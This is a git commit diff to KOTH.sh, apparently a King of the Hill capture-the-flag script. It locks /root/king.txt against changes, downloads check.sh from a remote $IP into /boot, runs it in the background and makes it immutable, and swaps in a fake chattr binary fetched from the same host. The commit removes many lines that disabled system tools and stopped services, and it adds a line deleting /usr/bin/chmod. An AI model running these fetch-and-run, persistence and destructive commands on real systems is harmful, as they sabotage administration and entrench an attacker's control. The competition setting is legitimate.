247c203830e627cdf31de9bc53355015af4a514f
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-05-26 09:53:02 +0100

    Update KOTH.sh

--- KOTH.sh
+++ KOTH.sh
@@ -19,27 +19,11 @@ echo "--------------------------------------------------------------------------
 echo "-----------------------------------------------------------------------------"
 echo 
 sudo chmod 0755 /usr/bin/pkexec
-sudo chmod -x /usr/bin/ftp
-sudo chmod -x /usr/bin/nano
-sudo chmod -x /usr/bin/vi
-sudo chmod -x /usr/bin/ip
-sudo chmod -x /usr/bin/ping
-sudo chmod -x /usr/bin/pico
-sudo chmod -x /usr/bin/find
-sudo rm -rf /usr/bin/screen
-sudo rm -rf /usr/bin/screen-4.5.0
 set write off
 echo 
 echo "Patch part successfully ended..."
 echo 
 echo "-----------------------------------------------------------------------------"
-echo 
-sudo systemctl stop tomcat
-sudo systemctl stop nginx
-sudo systemctl stop mariadb
-echo 
-echo "Services Stopped..."
-echo 
 echo "-----------------------------------------------------------------------------"
 echo 
 chmod +x /usr/bin/chattr
@@ -49,30 +33,12 @@ sudo chattr +i /root/king.txt
 sudo chmod 400 /root/king.txt
 set -o noclobber /root/king.txt
 echo 
+echo
 echo "-----------------------------------------------------------------------------"
 echo 
 echo "Files Operation Complete... Starting Operation 2..."
 echo 
 echo "-----------------------------------------------------------------------------"
-echo
-sudo rm -rf /usr/bin/chattr
-sudo chmod -x /usr/bin/systemctl
-sudo chmod -x /var
-sudo chmod -x /usr/bin/passwd
-sudo chmod -x /usr/bin/kill
-sudo chmod -x /usr/bin/killall
-sudo chmod -x /usr/bin/pkill
-sudo chmod -x /usr/bin/mv
-sudo chmod -x /usr/bin/curl
-sudo chmod -x /usr/bin/nano
-sudo chmod -x /usr/bin/vim
-sudo chmod -x /usr/bin/vi
-sudo chmod -x /usr/bin/python
-sudo chmod -x /usr/bin/python2
-sudo chmod -x /usr/bin/python3
-sudo chmod -x /usr/bin/nc
-sudo chmod -x /bin/nc
-echo
 echo
 echo "Let's Go Forward... :)"
 echo
@@ -80,11 +46,10 @@ echo "--------------------------------------------------------------------------
 alias kill='echo "Sorry, the kill command is disabled."'
 echo "-----------------------------------------------------------------------------"
 echo
-wget http://$IP/check.sh
-echo
+cd /boot && wget http://$IP/check.sh
 chmod +x check.sh
-echo
 ./check.sh "$nick" &
+chattr +ai /boot/check.sh
 echo
 echo "--------------------File successfully running in the background---------------"
 echo "-----------------------------------------------------------------------------"
@@ -93,12 +58,8 @@ cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
-sudo chmod -x /bin/kill
-sudo chmod -x /bin/systemctl
-sudo chmod -x /usr/bin/wget
-sudo chmod -x /usr/bin/chmod
-sudo chmod -x /bin/chmod
-sudo rm -rf /usr/bin/rm
+echo
+rm -rf /usr/bin/chmod
 echo
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
